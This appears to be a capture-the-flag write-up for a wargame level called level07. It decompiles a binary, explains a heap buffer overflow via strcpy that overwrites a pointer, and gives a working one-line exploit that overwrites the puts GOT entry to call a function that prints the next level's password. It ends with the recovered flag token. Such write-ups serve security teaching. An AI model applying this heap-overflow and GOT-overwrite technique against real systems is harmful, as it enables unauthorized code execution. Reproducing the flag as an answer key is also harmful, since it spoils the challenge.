# level07

1. Decompilation with Ghidra

    The binary contains a structure with heap allocation and buffer operations:

    ```c
    void main(int param_1, int param_2)
    {
        char **buffer1;
        char **buffer2;
        FILE *file;
        
        buffer1 = (char **)malloc(8);
        *buffer1 = (char *)malloc(4);
        buffer2 = (char **)malloc(8);
        *buffer2 = (char *)malloc(4);
        
        strcpy(*buffer1, *(char **)(param_2 + 4));  // argv[1]
        strcpy(*buffer2, *(char **)(param_2 + 8));  // argv[2]
        
        file = fopen("/home/user/level8/.pass", "r");
        fgets(c, 0x44, file);
        puts("~~");
        return;
    }
    ```

    ```c
    void m(void)
    {
        printf("%s - %d\n", c, time(NULL));
    }
    ```

2. Analysis of the vulnerability

    The vulnerability:
    - The function `m()` prints the password stored in global variable `c`.
    - Two heap allocations create a structure with pointers.
    - `strcpy(*buffer1, argv[1])` allows buffer overflow.
    - By overflowing the first buffer, we can overwrite the pointer in `buffer2`.
    - When `strcpy(*buffer2, argv[2])` is called, it writes to the address we control.
    - We can overwrite the GOT entry of `puts()` to redirect it to `m()`.

3. Finding the m() address and GOT entry

    Using gdb to find the `m()` address:

    ```bash
    gdb ./level7

    (gdb) info address m
    Symbol "m" is at 0x080484f4 in a file compiled without debugging.
    ```

    Finding the GOT address for `puts()`:

    ```bash
    objdump -R level7

    08049928 R_386_JUMP_SLOT   puts
    ```

4. Finding the offset

    We need to find the offset to overwrite the pointer in the heap structure.
    
    The first `malloc(8)` creates space for 2 pointers. The second `malloc(8)` follows.
    Testing with different padding sizes reveals that **20 bytes** are needed to reach
    the target pointer.

5. Exploitation

    Build the payload with two arguments:

    **First argument (argv[1])**: 20 bytes padding + GOT address of `puts()`
    - Padding: `"A" * 20`
    - Target: `0x08049928` (GOT entry for puts)
    - This overflows `*buffer1` and overwrites the pointer in `buffer2`

    **Second argument (argv[2])**: Address of `m()`
    - `0x080484f4` (address of m function)
    - This gets written to the GOT entry via the overwritten pointer

    ```bash
    ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
    ```

    Execution flow:
    1. First `strcpy` overflows and overwrites `buffer2` pointer to `0x08049928` (GOT puts)
    2. Second `strcpy` writes `0x080484f4` (address of m) to GOT puts
    3. When `puts()` is called, it jumps to `m()` instead
    4. `m()` prints the password from global variable `c`

6. Token discovered

    The token is: `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`